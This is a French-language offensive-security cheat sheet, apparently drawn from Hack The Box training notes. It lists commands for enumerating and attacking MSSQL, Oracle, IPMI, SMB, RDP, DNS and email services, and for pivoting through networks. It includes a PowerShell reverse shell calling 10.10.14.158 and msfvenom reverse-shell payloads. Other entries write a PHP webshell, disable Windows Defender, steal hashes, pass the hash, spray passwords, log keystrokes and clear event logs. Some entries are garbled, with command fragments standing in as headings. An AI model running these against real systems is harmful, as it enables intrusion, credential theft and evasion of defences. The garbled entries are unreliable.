### Sélectionner une des bases de données existantes

```bash
`use <database>;`
```

### Afficher toutes les tables disponibles dans la base de données sélectionnée

```bash
`show tables;`
```

### Afficher toutes les colonnes dans la base de données sélectionnée

```bash
`show columns from <table>;`
```

### Afficher tout le contenu de la table souhaitée

```bash
`select * from <table>;`
```

### Rechercher une `chaîne` spécifique dans la table souhaitée

```bash
`select * from <table> where <column> = "<string>";`
```

##### MSSQL

### Énumération

```bash
`nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip`
```

### Se connecter au serveur MSSQL en utilisant l'authentification Windows

```bash
`mssqlclient.py <user>@<FQDN/IP> -windows-auth`
```

```sql
# Obtenir la version du serveur Microsoft SQL
select @@version;

# Obtenir les noms d'utilisateurs
select user_name()
go 

# Obtenir les bases de données
SELECT name FROM master.dbo.sysdatabases
go

# Obtenir la base de données courante
SELECT DB_NAME()
go

# Obtenir la liste des utilisateurs dans le domaine
SELECT name FROM master..syslogins
go

# Obtenir la liste des utilisateurs qui sont sysadmins
SELECT name FROM master..syslogins WHERE sysadmin = 1
go

# Et pour vérifier : 
SELECT is_srvrolemember('sysadmin')
go
# Si votre utilisateur est admin, cela retournera 1.

# Lire les fichiers locaux dans MSSQL
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

#### Oracle TNS

### Effectuer divers scans pour recueillir des informations sur les services de base de données Oracle et ses composants

```bash
`python3 ./odat.py all -s <FQDN/IP>`
```

### Se connecter à la base de données Oracle

```bash
`sqlplus <user>/<pass>@<FQDN/IP>/<db>`
```

### Télécharger un fichier avec Oracle RDBMS

```bash
`python3 ./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt`
```

#### IPMI

### Énumération dans une plage réseau

```bash
`nmap -n-sU -p 623 $ip/24`
```

### Exécuter tous les scripts nmap liés au protocole IPMI

```bash
`sudo nmap -sU --script ipmi* -p 623 $ip`
```

### Détection de la version IPMI

```bash
`msf6 auxiliary(scanner/ipmi/ipmi_version)`
```

### Extraire les hachages IPMI. Similaire à l'attaque de récupération de hachage de mot de passe à distance d'authentification IPMI 2.0 RAKP

```bash
`msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)`
```

### **Attaque de contournement d'authentification IPMI via Cipher 0**<br>Installer ipmitool et utiliser Cipher 0 pour extraire une liste d'utilisateurs. Avec -C 0, tout mot de passe est accepté

```bash
`apt-get install ipmitool`<br>`ipmitool -I lanplus -C 0 -H $ip -U root -P root user list`
```

### **Attaque de récupération de hachage de mot de passe à distance d'authentification IPMI 2.0 RAKP**<br>Installer ipmitool et changer le mot de passe de root

```bash
`apt-get install ipmitool`<br>`ipmitool -I lanplus -C 0 -H $ip -U root -P root user set password 2 abc123`
```

### Gestion à Distance Linux

### Audit de sécurité à distance du service SSH cible

```bash
`ssh-audit.py <FQDN/IP>`
```

### Se connecter au serveur SSH en utilisant le client SSH

```bash
`ssh <user>@<FQDN/IP>`
```

### Se connecter au serveur SSH en utilisant une clé privée

```bash
`ssh -i private.key <user>@<FQDN/IP>`
```

### Forcer l'authentification par mot de passe

```bash
`ssh <user>@<FQDN/IP> -o PreferredAuthentications=password`
```

### Gestion à Distance Windows

#### RDP

### Analyse du service RDP

```bash
`nmap -Pn -sV -p3389 --script rdp-* $ip`
```

### Un script Perl nommé [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) a été développé par [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) qui peut identifier de manière non authentifiée les paramètres de sécurité des serveurs RDP basés sur les poignées de main

```bash
`git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check`<br><br>`./rdp-sec-check.pl $ip`
```

### Se connecter au serveur RDP depuis Linux

```bash
`xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>`
```

### Exécuter une commande en utilisant le service WMI

```bash
`wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"`
```

#### WinRM

### Analyse du service WinRM

```bash
`nmap -sV -sC $ip -p5985,5986 --disable-arp-ping -n`
```

### Se connecter au serveur WinRM

```bash
`evil-winrm -i <FQDN/IP> -u <user> -p <password>`
```

#### Windows Management Instrumentation (WMI)

### Se connecter au serveur WinRM

```bash
`evil-winrm -i <FQDN/IP> -u <user> -p <password>`
```

### Exécuter une commande en utilisant le service WMI

```bash
`wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"`
```

## Shells & Payloads

### Outil en ligne de commande utilisé pour se connecter à une cible Windows via le protocole RDP

```bash
`xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`
```

### Fonctionne avec différents interpréteurs de commandes pour découvrir les variables d'environnement d'un système. C'est un excellent moyen de déterminer quel langage de shell est utilisé

```bash
`env`
```

### Démarre un écouteur `netcat` sur un port spécifié

```bash
`sudo nc -lvnp <port #>`
```

### Se connecte à un écouteur netcat à l'adresse IP et au port spécifiés

```bash
`nc -nv <ip address of computer with listener started><port being listened on>`
```

### /bin/bash -i 2>&1 \

```bash
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \
```

### %{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \

```bash
`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\
```

### Commande Powershell utilisée pour désactiver la surveillance en temps réel dans `Windows Defender`

```bash
`Set-MpPreference -DisableRealtimeMonitoring $true`
```

### Module d'exploit Metasploit qui peut être utilisé sur un système Windows vulnérable pour établir une session shell en utilisant `smb` & `psexec`

```bash
`use exploit/windows/smb/psexec`
```

### Commande utilisée dans une session shell meterpreter pour accéder à un `shell système`

```bash
`shell`
```

### Commande `MSFvenom` utilisée pour générer un payload `stageless` de shell inverse basé sur Linux

```bash
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`
```

### Commande MSFvenom utilisée pour générer un payload stageless de shell inverse basé sur Windows

```bash
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`
```

### Commande MSFvenom utilisée pour générer un payload de shell inverse basé sur MacOS

```bash
`msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`
```

### Commande MSFvenom utilisée pour générer un payload de shell inverse web ASP

```bash
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`
```

### Commande MSFvenom utilisée pour générer un payload de shell inverse web JSP

```bash
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`
```

### Commande MSFvenom utilisée pour générer un payload de shell inverse web compatible java/jsp au format WAR

```bash
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`
```

### Module d'exploit Metasploit utilisé pour vérifier si un hôte est vulnérable à `ms17_010`

```bash
`use auxiliary/scanner/smb/smb_ms17_010`
```

### Module d'exploit Metasploit utilisé pour obtenir une session shell inverse sur un système Windows vulnérable à ms17_010

```bash
`use exploit/windows/smb/ms17_010_psexec`
```

### Module d'exploit Metasploit qui peut être utilisé pour obtenir un shell inverse sur un système Linux vulnérable hébergeant `rConfig 3.9.6`

```bash
`use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`
```

### Commande Python utilisée pour générer un `shell interactif` sur un système Linux

```bash
`python -c 'import pty; pty.spawn("/bin/sh")'`
```

### Génère un shell interactif sur un système Linux

```bash
`/bin/sh -i`
```

### Utilise `perl` pour générer un shell interactif sur un système Linux

```bash
`perl —e 'exec "/bin/sh";'`
```

### Utilise `ruby` pour générer un shell interactif sur un système Linux

```bash
`ruby: exec "/bin/sh"`
```

### Utilise `Lua` pour générer un shell interactif sur un système Linux

```bash
`Lua: os.execute('/bin/sh')`
```

### Utilise la commande `awk` pour générer un shell interactif sur un système Linux

```bash
`awk 'BEGIN {system("/bin/sh")}'`
```

### Utilise la commande `find` pour générer un shell interactif sur un système Linux

```bash
`find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`
```

### Une autre façon d'utiliser la commande `find` pour générer un shell interactif sur un système Linux

```bash
`find . -exec /bin/sh \; -quit`
```

### Utilise l'éditeur de texte `VIM` pour générer un shell interactif. Peut être utilisé pour échapper aux "jail-shells"

```bash
`vim -c ':!/bin/sh'`
```

### Utilisé pour `lister` les fichiers et répertoires sur un système Linux et affiche les permissions pour chaque fichier dans le répertoire choisi. Peut être utilisé pour rechercher des binaires que nous avons la permission d'exécuter

```bash
`ls -la <path/to/fileorbinary>`
```

### Affiche les commandes que l'utilisateur actuellement connecté peut exécuter avec `sudo`

```bash
`sudo -l`
```

### Emplacement des `webshells laudanum` sur ParrotOS et Pwnbox

```bash
`/usr/share/webshells/laudanum`
```

### Emplacement de `Antak-Webshell` sur Parrot OS et Pwnbox

```bash
`/usr/share/nishang/Antak-WebShell`
```

## Metasploit

### Commandes MSFconsole

### Affiche tous les exploits dans le Framework

```bash
`show exploits`
```

### Affiche tous les payloads dans le Framework

```bash
`show payloads`
```

### Affiche tous les modules auxiliaires dans le Framework

```bash
`show auxiliary`
```

### Recherche des exploits ou modules dans le Framework

```bash
`search <name>`
```

### Charge les informations sur un exploit ou module spécifique

```bash
`info`
```

### Charge un exploit ou module (exemple : use windows/smb/psexec)

```bash
`use <name>`
```

### Charge un exploit en utilisant le numéro d'index affiché après la commande search

```bash
`use <number>`
```

### L'adresse IP de votre hôte local accessible par la cible, souvent l'adresse IP publique lorsque vous n'êtes pas sur un réseau local. Généralement utilisé pour les shells inverses

```bash
`LHOST`
```

### L'hôte distant ou la cible

```bash
`RHOST`
```

### Définit une valeur spécifique (par exemple, LHOST ou RHOST)

```bash
`set function`
```

### Définit une valeur spécifique globalement (par exemple, LHOST ou RHOST)

```bash
`setg <function>`
```

### Affiche les options disponibles pour un module ou exploit

```bash
`show options`
```

### Affiche les plateformes prises en charge par l'exploit

```bash
`show targets`
```

### Spécifie un index de cible spécifique si vous connaissez l'OS et le service pack

```bash
`set target <number>`
```

### Spécifie le payload à utiliser

```bash
`set payload <payload>`
```

### Spécifie le numéro d'index du payload à utiliser après la commande show payloads

```bash
`set payload <number>`
```

### Affiche les options avancées

```bash
`show advanced`
```

### Migre automatiquement vers un processus séparé après l'achèvement de l'exploit

```bash
`set autorunscript migrate -f`
```

### Détermine si une cible est vulnérable à une attaque

```bash
`check`
```

### Exécute le module ou l'exploit et attaque la cible

```bash
`exploit`
```

### Exécute l'exploit dans le contexte du job (cela exécutera l'exploit en arrière-plan)

```bash
`exploit -j`
```

### N'interagit pas avec la session après une exploitation réussie

```bash
`exploit -z`
```

### Spécifie l'encodeur de payload à utiliser (exemple : exploit –e shikata_ga_nai)

```bash
`exploit -e <encoder>`
```

### Affiche l'aide pour la commande exploit

```bash
`exploit -h`
```

### Liste les sessions disponibles (utilisé lors de la gestion de plusieurs shells)

```bash
`sessions -l`
```

### Liste toutes les sessions disponibles et affiche les champs détaillés, comme la vulnérabilité utilisée lors de l'exploitation du système

```bash
`sessions -l -v`
```

### Exécute un script Meterpreter spécifique sur toutes les sessions Meterpreter actives

```bash
`sessions -s <script>`
```

### Termine toutes les sessions actives

```bash
`sessions -K`
```

### Exécute une commande sur toutes les sessions Meterpreter actives

```bash
`sessions -c <cmd>`
```

### Met à niveau a normal Win32 shell to a Meterpreter console

```bash
`sessions -u <sessionID>`
```

### Crée une base de données à utiliser avec des attaques basées sur la base de données (exemple : db_create autopwn)

```bash
`db_create <name>`
```

### Crée et se connecte à une base de données pour des attaques (exemple : db_connect autopwn)

```bash
`db_connect <name>`
```

### Utilise Nmap et place les résultats dans une base de données (la syntaxe Nmap normale est prise en charge, comme –sT –v –P0)

```bash
`db_nmap`
```

### Supprime la base de données actuelle

```bash
`db_destroy`
```

### Supprime la base de données en utilisant des options avancées

```bash
`db_destroy <user:password@host:port/database>`
```

---

### Commandes Meterpreter

### Affiche l'aide d'utilisation de Meterpreter

```bash
`help`
```

### Exécute des scripts basés sur Meterpreter ; pour une liste complète, consultez le répertoire scripts/meterpreter

```bash
`run <scriptname>`
```

### Affiche les informations système sur la cible compromise

```bash
`sysinfo`
```

### Liste les fichiers et dossiers sur la cible

```bash
`ls`
```

### Charge l'extension de privilèges pour les bibliothèques Meterpreter étendues

```bash
`use priv`
```

### Affiche tous les processus en cours d'exécution et les comptes associés à chaque processus

```bash
`ps`
```

### Migre vers un ID de processus spécifique (PID est l'ID du processus cible obtenu via la commande ps)

```bash
`migrate <proc. id>`
```

### Charge les fonctions incognito (utilisé pour le vol et l'usurpation de jetons sur une machine cible)

```bash
`use incognito`
```

### Liste les jetons disponibles sur la cible par utilisateur

```bash
`list_tokens -u`
```

### Liste les jetons disponibles sur la cible par groupe

```bash
`list_tokens -g`
```

### Usurpe un jeton disponible sur la cible

```bash
`impersonate_token <DOMAIN_NAMEUSERNAME>`
```

### Vole les jetons disponibles pour un processus donné et usurpe ce jeton

```bash
`steal_token <proc. id>`
```

### Arrête l'usurpation du jeton actuel

```bash
`drop_token`
```

### Tente d'élever les privilèges au niveau SYSTEM via plusieurs vecteurs d'attaque

```bash
`getsystem`
```

### Accède à un shell interactif avec tous les jetons disponibles

```bash
`shell`
```

### Exécute cmd.exe et interagit avec lui

```bash
`execute -f <cmd.exe> -i`
```

### Exécute cmd.exe avec tous les jetons disponibles

```bash
`execute -f <cmd.exe> -i -t`
```

### Exécute cmd.exe avec tous les jetons disponibles et le rend comme processus caché

```bash
`execute -f <cmd.exe> -i -H -t`
```

### Revient à l'utilisateur original utilisé pour compromettre la cible

```bash
`rev2self`
```

### Interagit, crée, supprime, interroge, définit et bien plus dans le registre de la cible

```bash
`reg <command>`
```

### Bascule vers un écran différent en fonction de l'utilisateur connecté

```bash
`setdesktop <number>`
```

### Prend une capture d'écran de l'écran de la cible

```bash
`screenshot`
```

### Téléverse un fichier vers la cible

```bash
`upload <filename>`
```

### Télécharge un fichier depuis la cible

```bash
`download <filename>`
```

### Démarre la capture des frappes clavier sur la cible distante

```bash
`keyscan_start`
```

### Extrait les frappes clavier capturées sur la cible

```bash
`keyscan_dump`
```

### Arrête la capture des frappes clavier sur la cible distante

```bash
`keyscan_stop`
```

### Obtient autant de privilèges que possible sur la cible

```bash
`getprivs`
```

### Prend le contrôle du clavier et/ou de la souris

```bash
`uictl enable <keyboard/mouse>`
```

### Exécute votre shell Meterpreter actuel en arrière-plan

```bash
`background`
```

### Extrait tous les hachages sur la cible

```bash
`hashdump`
```

### Charge le module sniffer

```bash
`use sniffer`
```

### Liste les interfaces disponibles sur la cible

```bash
`sniffer_interfaces`
```

### Démarre la capture sur la cible distante

```bash
`sniffer_dump <interfaceID> pcapname`
```

### Démarre la capture avec une plage spécifique pour un tampon de paquets

```bash
`sniffer_start <interfaceID> packet-buffer`
```

### Récupère les informations statistiques de l'interface que vous capturez

```bash
`sniffer_stats <interfaceID>`
```

### Arrête le sniffer

```bash
`sniffer_stop <interfaceID>`
```

### Ajoute un utilisateur sur la cible distante

```bash
`add_user <username> <password> -h <ip>`
```

### Ajoute un nom d'utilisateur au groupe Administrateurs du domaine sur la cible distante

```bash
`add_group_user <"Domain Admins"> <username> -h <ip>`
```

### Efface le journal des événements sur la machine cible

```bash
`clearev`
```

### Modifie les attributs de fichier, comme la date de création (mesure anti-forensique)

```bash
`timestomp`
```

### Redémarre la machine cible

```bash
`reboot`
```

---

## Attaques des Services Courants

### Attaque FTP

### Connexion au serveur FTP en utilisant le client `ftp`

```bash
`ftp 192.168.2.142`
```

### Connexion au serveur FTP en utilisant `netcat`

```bash
`nc -v 192.168.2.142 21`
```

### Force brute du service FTP

```bash
`hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142`
```

### Force brute du service FTP

```bash
`medusa -U users.list -P pws.list -h $ip -M ftp -n 2121`
```

### Attaque SMB

### Test de session nulle contre le service SMB

```bash
`smbclient -N -L //10.129.14.128`
```

### Énumération des partages réseau en utilisant `smbmap`

```bash
`smbmap -H 10.129.14.128`
```

### Énumération récursive des partages réseau en utilisant `smbmap`

```bash
`smbmap -H 10.129.14.128 -r notes`
```

### Téléchargement d'un fichier spécifique depuis le dossier partagé

```bash
`smbmap -H 10.129.14.128 --download "notes\note.txt"`
```

### Téléversement d'un fichier spécifique vers le dossier partagé

```bash
`smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`
```

### Session nulle avec `rpcclient`

```bash
`rpcclient -U'%' 10.10.110.17`
```

### Énumération automatisée du service SMB en utilisant `enum4linux-ng`

```bash
`./enum4linux-ng.py 10.10.11.45 -A -C`
```

### Pulvérisation de mot de passe contre différents utilisateurs depuis une liste

```bash
`crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'`
```

### Connexion au service SMB en utilisant `impacket-psexec`

```bash
`impacket-psexec administrator:'Password123!'@10.10.110.17`
```

### Exécution d'une commande sur le service SMB en utilisant `crackmapexec`

```bash
`crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`
```

### Énumération des utilisateurs connectés

```bash
`crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`
```

### Extraction des hachages depuis la base de données SAM

```bash
`crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`
```

### Utilisation de la technique Pass-The-Hash pour s'authentifier sur l'hôte cible

```bash
`crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`
```

### Extraction de la base de données SAM en utilisant `impacket-ntlmrelayx`

```bash
`impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`
```

### Exécution d'un shell inverse basé sur PowerShell en utilisant `impacket-ntlmrelayx`

```bash
`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>`
```

---

### Attaque des Bases de Données SQL

### Connexion au serveur MySQL

```bash
`mysql -u julio -pPassword123 -h 10.129.20.13`
```

### Connexion au serveur MSSQL

```bash
`sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`
```

### Connexion au serveur MSSQL depuis Linux

```bash
`sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`
```

### Connexion au serveur MSSQL depuis Linux lorsque le mécanisme d'authentification Windows est utilisé par le serveur MSSQL

```bash
`sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`
```

### Afficher toutes les bases de données disponibles dans MySQL

```bash
`mysql> SHOW DATABASES;`
```

### Sélectionner une base de données spécifique dans MySQL

```bash
`mysql> USE htbusers;`
```

### Afficher toutes les tables disponibles dans la base de données sélectionnée dans MySQL

```bash
`mysql> SHOW TABLES;`
```

### Sélectionner toutes les entrées disponibles de la table "users" dans MySQL

```bash
`mysql> SELECT * FROM users;`
```

### Afficher toutes les bases de données disponibles dans MSSQL

```bash
`sqlcmd> SELECT name FROM master.dbo.sysdatabases`
```

### Sélectionner une base de données spécifique dans MSSQL

```bash
`sqlcmd> USE htbusers`
```

### Afficher toutes les tables disponibles dans la base de données sélectionnée dans MSSQL

```bash
`sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`
```

### Sélectionner toutes les entrées disponibles de la table "users" dans MSSQL

```bash
`sqlcmd> SELECT * FROM users`
```

### Pour autoriser la modification des options avancées

```bash
`sqlcmd> EXECUTE sp_configure 'show advanced options', 1`
```

### Pour activer xp_cmdshell

```bash
`sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`
```

### À utiliser après chaque commande sp_configure pour appliquer les modifications

```bash
`sqlcmd> RECONFIGURE`
```

### Exécuter une commande système depuis le serveur MSSQL

```bash
`sqlcmd> xp_cmdshell 'whoami'`
```

### Créer un fichier en utilisant MySQL

```bash
`mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`
```

### Vérifier si les privilèges de fichier sécurisé sont vides pour lire les fichiers stockés localement sur le système

```bash
`mysql> show variables like "secure_file_priv";`
```

### Lire des fichiers locaux dans MSSQL

```bash
`sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`
```

### Lire des fichiers locaux dans MySQL

```bash
`mysql> select LOAD_FILE("/etc/passwd");`
```

### Vol de hachages en utilisant la commande `xp_dirtree` dans MSSQL

```bash
`sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`
```

### Vol de hachages en utilisant la commande `xp_subdirs` dans MSSQL

```bash
`sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`
```

### Identifier les serveurs liés dans MSSQL

```bash
`sqlcmd> SELECT srvname, isremote FROM sysservers`
```

### Identifier l'utilisateur et ses privilèges utilisés pour la connexion distante dans MSSQL

```bash
`sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`
```

---

### Attacking RDP

### Pulvérisation de mot de passe contre le service RDP

```bash
`crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`
```

### Force brute du service RDP

```bash
`hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`
```

### Connexion au service RDP en utilisant `rdesktop` sous Linux

```bash
`rdesktop -u admin -p password123 192.168.2.143`
```

### Usurper un utilisateur sans son mot de passe

```bash
`tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`
```

### Exécuter le détournement de session RDP

```bash
`net start sessionhijack`
```

### Activer le "Mode Admin Restreint" sur l'hôte Windows cible

```bash
`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
```

### Utiliser la technique Pass-The-Hash pour se connecter à l'hôte cible sans mot de passe

```bash
`xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`
```

### Attaque DNS

### Effectuer une tentative de transfert de zone AXFR contre un serveur de noms spécifique

```bash
`dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`
```

### Force brute des sous-domaines

```bash
`subfinder -d inlanefreight.com -v`
```

### Recherche DNS pour le sous-domaine spécifié

```bash
`host support.inlanefreight.com`
```

### Attaque des Services Email

### Recherche DNS des serveurs de messagerie pour le domaine spécifié

```bash
`host -t MX microsoft.com`
```

### grep "MX" \

```bash
`dig mx inlanefreight.com \
```

### Recherche DNS de l'adresse IPv4 pour le sous-domaine spécifié

```bash
`host -t A mail1.inlanefreight.htb.`
```

### Connexion au serveur SMTP

```bash
`telnet 10.10.110.20 25`
```

### Énumération des utilisateurs SMTP en utilisant la commande RCPT contre l'hôte spécifié

```bash
`smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`
```

### Vérifier l'utilisation d'Office365 pour le domaine spécifié

```bash
`python3 o365spray.py --validate --domain msplaintext.xyz`
```

### Énumérer les utilisateurs existants utilisant Office365 sur le domaine spécifié

```bash
`python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`
```

### Pulvérisation de mot de passe contre une liste d'utilisateurs utilisant Office365 pour le domaine spécifié

```bash
`python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`
```

### Force brute du service POP3

```bash
`hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`
```

### Tester le service SMTP pour la vulnérabilité de relais ouvert

```bash
`swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213`
```


# Pivotage, Tunneling et Redirection de Ports

## Table des matières
1. [Commandes de Base pour l'Analyse Réseau](#commandes-de-base-pour-lanalyse-réseau)
2. [Tunnels SSH](#tunnels-ssh)
3. [Proxychains et SOCKS](#proxychains-et-socks)
4. [Transfert de Fichiers et Payload](#transfert-de-fichiers-et-payload)
5. [Découverte de Réseau](#découverte-de-réseau)
6. [Port Forwarding avec Meterpreter](#port-forwarding-avec-meterpreter)
7. [Outils Spécialisés](#outils-spécialisés)
8. [Tunneling DNS et ICMP](#tunneling-dns-et-icmp)
9. [Solutions Windows](#solutions-windows)

## Commandes de Base pour l'Analyse Réseau

### Commande Linux qui affiche toutes les configurations réseau actuelles d'un système.

```bash
`ifconfig`
```

### Commande Windows qui affiche toutes les configurations réseau du système.

```bash
`ipconfig`
```

### Commande utilisée pour afficher la table de routage pour tous les protocoles IPv4.

```bash
`netstat -r`
```

### Affiche toutes (`-a`) les connexions réseau actives avec les IDs de processus associés. `-t` affiche uniquement les connexions TCP, `-n` affiche uniquement les adresses numériques, `-p` affiche les IDs de processus associés à chaque connexion.

```bash
`netstat -antp`
```

### Commande Nmap utilisée pour scanner une cible à la recherche de ports ouverts permettant des connexions SSH ou MySQL.

```bash
`nmap -sT -p22,3306 <AdresseIPduCible>`
```

## Tunnels SSH

### Commande SSH utilisée pour créer un tunnel SSH depuis une machine locale sur le port local `1234` vers une cible distante utilisant le port 3306.

```bash
`ssh -L 1234:localhost:3306 Ubuntu@<AdresseIPduCible>`
```

### grep 1234`

```bash
`netstat -antp \
```

### Commande Nmap utilisée pour scanner un hôte via une connexion établie sur le port local `1234`.

```bash
`nmap -v -sV -p1234 localhost`
```

### Commande SSH qui demande au client ssh de demander au serveur SSH de transférer toutes les données via le port `1234` vers `localhost:3306`.

```bash
`ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<AdresseIPduCible>`
```

### Commande SSH utilisée pour effectuer une redirection de port dynamique sur le port `9050` et établir un tunnel SSH avec la cible. Cela fait partie de la configuration d'un proxy SOCKS.

```bash
`ssh -D 9050 ubuntu@<AdresseIPduCible>`
```

### Commande SSH utilisée pour créer un tunnel SSH inverse d'une cible vers un hôte d'attaque. Le trafic est transféré sur le port `8080` sur l'hôte d'attaque vers le port `80` sur la cible.

```bash
`ssh -R <IPInterneDuHôtePivot>:8080:0.0.0.0:80 ubuntu@<AdresseIPduCible> -vN`
```

## Proxychains et SOCKS

### Commande Linux utilisée pour afficher les 4 dernières lignes de /etc/proxychains.conf. Peut être utilisée pour s'assurer que les configurations socks sont en place.

```bash
`tail -4 /etc/proxychains.conf`
```

### Utilisé pour envoyer le trafic généré par un scan Nmap via Proxychains et un proxy SOCKS. Le scan est effectué contre les hôtes dans la plage spécifiée `172.16.5.1-200` avec une verbosité accrue (`-v`) désactivant le scan ping (`-sn`).

```bash
`proxychains nmap -v -sn 172.16.5.1-200`
```

### Utilisé pour envoyer le trafic généré par un scan Nmap via Proxychains et un proxy SOCKS. Le scan est effectué contre 172.16.5.19 avec une verbosité accrue (`-v`), désactivant la découverte ping (`-Pn`), et en utilisant le type de scan TCP connect (`-sT`).

```bash
`proxychains nmap -v -Pn -sT 172.16.5.19`
```

### Utilise Proxychains pour ouvrir Metasploit et envoyer tout le trafic réseau généré via un proxy SOCKS.

```bash
`proxychains msfconsole`
```

### Utilisé pour se connecter à une cible en utilisant RDP et un ensemble d'identifiants via proxychains. Cela enverra tout le trafic via un proxy SOCKS.

```bash
`proxychains xfreerdp /v:<AdresseIPduCible> /u:victor /p:pass@123`
```

### Ouvre firefox avec Proxychains et envoie la requête web via un serveur proxy SOCKS vers le serveur web de destination spécifié.

```bash
`proxychains firefox-esr <AdresseIPduServeurWebCible>:80`
```

### Ligne de texte qui doit être ajoutée à /etc/proxychains.conf pour garantir qu'un proxy SOCKS version 4 est utilisé en combinaison avec proxychains sur l'adresse IP et le port spécifiés.

```bash
`socks4 127.0.0.1 9050`
```

### Ligne de texte qui doit être ajoutée à /etc/proxychains.conf pour garantir qu'un proxy SOCKS version 5 est utilisé en combinaison avec proxychains sur l'adresse IP et le port spécifiés.

```bash
`Socks5 127.0.0.1 1080`
```

## Transfert de Fichiers et Payload

### Utilise msfvenom pour générer un payload Meterpreter reverse HTTPS Windows qui enverra un rappel à l'adresse IP spécifiée après `lhost=` sur le port local 8080 (`LPORT=8080`). Le payload prendra la forme d'un fichier exécutable appelé `backupscript.exe`.

```bash
`msfvenom -p windows/x64/meterpreter/reverse_https lhost= <IPInterneDuHôtePivot> -f exe -o backupscript.exe LPORT=8080`
```

### Utilisé pour sélectionner le module d'exploit multi-handler dans Metasploit.

```bash
`msf6 > use exploit/multi/handler`
```

### Utilise le protocole de copie sécurisée (`scp`) pour transférer le fichier `backupscript.exe` vers l'hôte spécifié et le place dans le répertoire personnel de l'utilisateur Ubuntu (`:~/`).

```bash
`scp backupscript.exe ubuntu@<AdresseIPduCible>:~/`
```

### Utilise Python3 pour démarrer un serveur HTTP simple écoutant sur le port `8123`. Peut être utilisé pour récupérer des fichiers depuis un hôte.

```bash
`python3 -m http.server 8123`
```

### Commande PowerShell utilisée pour télécharger un fichier appelé backupscript.exe depuis un serveur web (`172.16.5.129:8123`) puis enregistrer le fichier à l'emplacement spécifié après `-OutFile`.

```bash
`Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`
```

